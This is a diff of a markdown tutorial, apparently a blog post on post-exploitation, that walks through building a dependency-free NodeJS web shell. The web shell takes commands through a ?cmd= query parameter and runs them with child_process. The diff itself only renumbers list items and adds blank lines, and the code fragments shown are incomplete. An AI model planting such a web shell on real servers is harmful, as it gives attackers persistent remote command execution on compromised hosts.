@@ -84,12 +84,14 @@ We will do an example in NodeJS with no external dependencies 😲 and I will al
 
 
 1. the components that we will need are the 'http', 'url' and 'child_process' modules that Node provides out of the box
+
 ```javascript
 const http = require('http');
 const process = require('child_process');
 const url = require('url');
 ```
-2. create the server that will execute our commands/the payload and set up the hostname IP and port
+1. create the server that will execute our commands/the payload and set up the hostname IP and port
+
 ``` javascript
 const http = require('http');
 const process = require('child_process');
@@ -133,7 +135,7 @@ const server = http.createServer((req, res) => {
 ---
 
 Back to our webshell.
-3. we will insert all our payloads as *?cmd=evilCommand*, so to do this, we will take the url, parse it and get the query from it
+1. we will insert all our payloads as *?cmd=evilCommand*, so to do this, we will take the url, parse it and get the query from it
 
 ``` javascript
 const http = require('http');
@@ -167,6 +169,7 @@ If you were to test the shell so far by going to *http://127.0.0.1:9002/?cmd=who
 ![Web Shell 1](/../posts_resources/Life-after-getting-root/web-shell1.png) 
 
 1. execute the payload and send back the result of stdout
+
 ```javascript
 const http = require('http');
 const process = require('child_process');
